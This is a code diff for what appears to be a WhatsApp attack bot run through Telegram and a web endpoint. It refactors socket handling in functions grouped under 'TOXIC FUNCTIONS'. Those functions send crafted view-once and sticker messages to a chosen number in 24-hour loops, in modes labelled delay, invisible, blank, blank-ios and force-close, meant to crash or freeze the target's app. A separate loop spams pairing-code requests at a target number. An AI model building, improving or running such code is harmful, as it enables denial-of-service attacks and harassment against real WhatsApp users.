@@ -53,7 +53,7 @@ const sessions_dir = "./auth";
 const file = "./database/akses.json";
 const userPath = path.join(__dirname, "./database/user.json");
 let userApiBug = null;
-let sock;
+// let sock; // removed global sock
 
 
 function loadAkses() {
@@ -328,6 +328,40 @@ const makeCode = (number, code) => ({
   parse_mode: "HTML"
 });
 
+const startSession = async (BotNumber) => {
+  const sessionDir = sessionPath(BotNumber);
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+  const { version } = await fetchLatestWaWebVersion();
+
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: pino({ level: "silent" }),
+    version: version,
+    defaultQueryTimeoutMs: undefined,
+  });
+
+  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+    if (connection === "open") {
+      console.log(chalk.green(`Bot ${BotNumber} terhubung!`));
+      sessions.set(BotNumber, sock);
+    }
+    if (connection === "close") {
+      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+      if (shouldReconnect) {
+        console.log(chalk.yellow(`Bot ${BotNumber} terputus, mencoba reconnect dalam 5 detik...`));
+        setTimeout(() => startSession(BotNumber), 5000);
+      } else {
+        console.log(chalk.red(`Bot ${BotNumber} ditutup permanen (Logged Out).`));
+        sessions.delete(BotNumber);
+      }
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+  return sock;
+};
+
 const initializeWhatsAppConnections = async () => {
   if (!fs.existsSync(file_session)) return;
   const activeNumbers = JSON.parse(fs.readFileSync(file_session));
@@ -341,39 +375,8 @@ const initializeWhatsAppConnections = async () => {
 
   for (const BotNumber of activeNumbers) {
     console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
-    const sessionDir = sessionPath(BotNumber);
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version, isLatest } = await fetchLatestWaWebVersion();
-
-    sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-    });
-
-    await new Promise((resolve, reject) => {
-      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
-        if (connection === "open") {
-          console.log(`Bot ${BotNumber} terhubung!`);
-          sessions.set(BotNumber, sock);
-          return resolve();
-        }
-        if (connection === "close") {
-  const shouldReconnect =
-    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-
-  if (shouldReconnect) {
-    console.log("Koneksi tertutup, mencoba reconnect...");
-    await initializeWhatsAppConnections();
-  } else {
-    console.log("Koneksi ditutup permanen (Logged Out).");
-  }
-}
-});
-      sock.ev.on("creds.update", saveCreds);
-    });
+    await startSession(BotNumber);
+    await new Promise(r => setTimeout(r, 2000)); // Jeda antar koneksi
   }
 };
 
@@ -393,7 +396,7 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
 
   const { version, isLatest } = await fetchLatestWaWebVersion();
 
-    sock = makeWASocket({
+    const sock = makeWASocket({
       auth: state,
       printQRInTerminal: false,
       logger: pino({ level: "silent" }),
@@ -402,6 +405,7 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
     });
 
   let isConnected = false;
+  let pairingRequested = false;
 
   sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
     if (connection === "close") {
@@ -426,7 +430,9 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
     }
 
     if (connection === "connecting") {
-      await new Promise(r => setTimeout(r, 1000));
+      if (pairingRequested) return;
+      pairingRequested = true;
+      await new Promise(r => setTimeout(r, 5000));
       try {
         if (!fs.existsSync(`${sessionDir}/creds.json`)) {
           const code = await sock.requestPairingCode(BotNumber, "DEWAXBOS");
@@ -460,11 +466,12 @@ const sendPairingLoop = async (targetNumber, ctx, chatId) => {
     );
 
     // pastikan koneksi WA aktif
-    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");
+    const activeSock = sessions.values().next().value;
+    if (!activeSock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");
 
     for (let i = 1; i <= total; i++) {
       try {
-        const code = await global.sock.requestPairingCode(targetNumber, "TOXICXXI");
+        const code = await activeSock.requestPairingCode(targetNumber, "TOXICXXI");
         const formatted = code.match(/.{1,4}/g)?.join("-") || code;
 
         await ctx.telegram.sendMessage(
@@ -1283,16 +1290,19 @@ app.get("/execution", (req, res) => {
       }
 
       try {
+        const activeSock = sessions.values().next().value;
+        if (!activeSock) throw new Error("Tidak ada sesi WhatsApp yang aktif.");
+
         if (mode === "delay") {
-          GetSuZoXAndros(24, target);
+          GetSuZoXAndros(activeSock, 24, target);
         } else if (mode === "invis") {
-          invis(24, target);
+          invis(activeSock, 24, target);
         } else if (mode === "blank") {
-          blankandro(24, target);
+          blankandro(activeSock, 24, target);
         } else if (mode === "blank-ios") {
-          blankios(24, target);
+          blankios(activeSock, 24, target);
         } else if (mode === "fc") {
-          fc(24, target);
+          fc(activeSock, 24, target);
         } else {
           throw new Error("Mode tidak dikenal.");
         }
@@ -1342,7 +1352,7 @@ module.exports = {
 };
 
 // ==================== TOXIC FUNCTIONS ==================== //
-async function Atut(target) {
+async function Atut(sock, target) {
     const OndetMsg1 = await generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
@@ -1428,7 +1438,7 @@ async function Atut(target) {
     });
 }
 
-async function Invisibledk(target) {
+async function Invisibledk(sock, target) {
   const msg = {
     stickerMessage: {
       url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
@@ -1482,7 +1492,7 @@ async function Invisibledk(target) {
   console.log(chalk.red(`─────「 ⏤!InvisibleDelay To: ${target}!⏤ 」─────`))
 }
 
-async function GetSuZoXAndros(durationHours, X) {
+async function GetSuZoXAndros(sock, durationHours, X) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1498,8 +1508,8 @@ async function GetSuZoXAndros(durationHours, X) {
     try {
       if (count < 10) {
         await Promise.all([
-        Atut(X),
-        Invisibledk(X),
+        Atut(sock, X),
+        Invisibledk(sock, X),
            await sleep(1000)
            ]);
         console.log(chalk.yellow(`
@@ -1528,7 +1538,7 @@ async function GetSuZoXAndros(durationHours, X) {
   sendNext();
 }
 
-async function blankandro(durationHours, X) {
+async function blankandro(sock, durationHours, X) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1544,8 +1554,8 @@ async function blankandro(durationHours, X) {
     try {
       if (count < 10) {
         await Promise.all([
-        Atut(X),
-        Invisibledk(X),
+        Atut(sock, X),
+        Invisibledk(sock, X),
             await sleep(1000)
         ]);
         console.log(chalk.yellow(`
@@ -1574,7 +1584,7 @@ async function blankandro(durationHours, X) {
   sendNext();
 }
 
-async function fc(durationHours, X) {
+async function fc(sock, durationHours, X) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1590,8 +1600,8 @@ async function fc(durationHours, X) {
     try {
       if (count < 10) {
         await Promise.all([
-        Atut(X),
-        Invisibledk(X),
+        Atut(sock, X),
+        Invisibledk(sock, X),
             await sleep(1000),
         ]);
         console.log(chalk.yellow(`
@@ -1620,7 +1630,7 @@ async function fc(durationHours, X) {
   sendNext();
 }
 
-async function blankios(durationHours, X) {
+async function blankios(sock, durationHours, X) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1637,8 +1647,8 @@ async function blankios(durationHours, X) {
       if (count < 10) {
         await Promise.all([
 
-            Atut(X),
-        Invisibledk(X),
+            Atut(sock, X),
+        Invisibledk(sock, X),
             await sleep(1000)
         ]);
         console.log(chalk.yellow(`
@@ -1669,7 +1679,7 @@ async function blankios(durationHours, X) {
 
 
 
-async function invis(durationHours, X) {
+async function invis(sock, durationHours, X) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1685,8 +1695,8 @@ async function invis(durationHours, X) {
     try {
       if (count < 10) {
         await Promise.all([
-          Atut(X),
-        Invisibledk(X),
+          Atut(sock, X),
+        Invisibledk(sock, X),
             await sleep(1000)
         ]);
         console.log(chalk.yellow(`
